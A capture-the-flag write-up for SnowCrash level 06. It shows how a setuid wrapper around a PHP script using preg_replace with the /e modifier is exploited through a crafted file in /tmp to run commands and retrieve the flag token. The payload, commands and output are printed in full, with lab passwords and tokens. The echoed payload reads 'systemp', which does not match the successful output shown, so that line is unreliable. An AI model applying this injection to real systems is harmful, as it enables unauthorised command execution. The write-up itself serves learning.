# Level 06 : found flag06

```bash
ssh level06@192.168.1.37 -p 4242
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          192.168.1.37
level06@192.168.1.37's password: viuaaale9huek52boumoomioc
level06@SnowCrash:~$
```

```bash
level06@SnowCrash:~$ ls -la
total 24
dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
-r-x------  1 level06 level06  675 Apr  3  2012 .profile
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
```

Both files `level06` and `level06.php` have been created by flag06.

```bash
level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
```

So the code of `level06.php` is actualy read by `level06`

```bash
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

```bash
level06@SnowCrash:~$ php --version
PHP 5.3.10-1ubuntu3.19 with Suhosin-Patch (cli) (built: Jul  2 2015 15:05:54)
Copyright (c) 1997-2012 The PHP Group
Zend Engine v2.3.0, Copyright (c) 1998-2012 Zend Technologies
```

As we see in [level06.php](level06.php), the script is takes 2 arguments, read the content of the first argument, and changes his values to output them.\
But to do that, it uses preg_replace with `/e` option with known as degerous in PHP.

So we can use that point and create a files `/tmp/l06` with bad values :

```bash
echo "[x {${systemp($z)}}]" > /tmp/l06
```

Then call the function with arguments :

```bash
level06@SnowCrash:~$ ./level06 /tmp/l06 whoami
flag06
PHP Notice:  Undefined variable: flag06 in /home/user/level06/level06.php(4) : regexp code on line 1

```

We succefully executed the command `whoami` as flag06

```bash
level06@SnowCrash:~$ ./level06 /tmp/l06 getflag
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1

```

****************************************

Documentations :
* https://www.php.net/manual/fr/function.preg-replace.php
* https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace
* https://www.php.net/manual/fr/language.types.string.php
